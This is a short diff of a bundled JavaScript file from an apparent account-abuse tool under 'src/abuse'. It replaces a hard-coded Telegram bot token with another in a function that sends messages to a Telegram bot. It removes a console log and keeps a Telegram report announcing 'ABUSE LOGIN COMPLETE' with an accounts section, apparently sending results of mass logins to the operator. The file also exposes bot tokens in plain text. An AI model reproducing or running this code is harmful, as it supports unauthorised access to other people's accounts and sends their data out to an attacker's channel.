@@ -52318,7 +52318,7 @@ var {
 
 // src/abuse/helpers/sendToMainBot.ts
 var sendToBotByChatIdText = async (chatId, text) => {
-  const token = "6324276078:AAEGmvX4RI-qoJnKkNpBFhVYuYJTyHweCIo";
+  const token = "7983269303:AAEBn8pGLk3LrMS2hpX9FDhurEsEa20RGPc";
   const sendMessageUrl = `https://api.telegram.org/bot${token}/sendMessage`;
   const splitTextIntoChunks = (text2, chunkSize = 4096) => {
     const chunks = [];
@@ -52614,9 +52614,6 @@ var makeMetricsAll = async (promises, startTime = Date.now()) => {
       return `${remainingSeconds}s`;
     }
   };
-  console.log({
-    message: "\u{1F4A5} ABUSE LOGIN COMPLETE \u{1F4A5}"
-  });
   await sendToMainBot(`\u{1F4A5} ABUSE LOGIN COMPLETE \u{1F4A5}
 
 * \u0410\u041A\u041A\u0410\u0423\u041D\u0422\u042B * 
